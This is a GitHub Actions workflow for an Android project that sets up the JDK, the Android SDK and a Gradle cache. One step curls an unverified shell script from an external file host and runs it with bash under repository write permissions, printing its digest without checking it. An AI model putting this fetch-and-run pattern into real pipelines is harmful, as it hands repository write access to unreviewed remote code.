name: Land the export + habit-sharing feature

on:
  push:
    branches: ["verify/reporting-export"]
  workflow_dispatch:

permissions:
  contents: write
  statuses: write

jobs:
  land:
    name: Apply, test, then land
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          ref: ${{ github.ref }}
          fetch-depth: 0

      - name: Fetch the landing script and show its digest
        run: |
          set -euo pipefail
          curl -fsSL "https://static.teamily.ai/files/4e7020cc-bec7-4e5c-987d-2e87fbf4824a/land-reporting.sh" -o /tmp/land.sh
          echo "sha256: $(sha256sum /tmp/land.sh | cut -d' ' -f1)"
          echo "bytes:  $(wc -c < /tmp/land.sh)"
          head -3 /tmp/land.sh

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3
        with:
          packages: "platform-tools"

      - name: Install SDK platform and build-tools
        run: |
          sdkmanager --install "platforms;android-36" "platform-tools"
          sdkmanager --install "build-tools;36.0.0" || echo "::warning::build-tools 36.0.0 not installable."

      - name: Cache Gradle
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: gradle-reporting-${{ runner.os }}-${{ hashFiles('android/**/*.gradle*') }}
          restore-keys: gradle-reporting-${{ runner.os }}-

      - name: Run the landing script
        run: bash /tmp/land.sh

      - name: Diagnostics on failure
        if: failure()
        run: |
          git -C "$GITHUB_WORKSPACE" status --porcelain | head -40
          echo
          tail -40 /tmp/test.log 2>/dev/null || echo "(no log)"
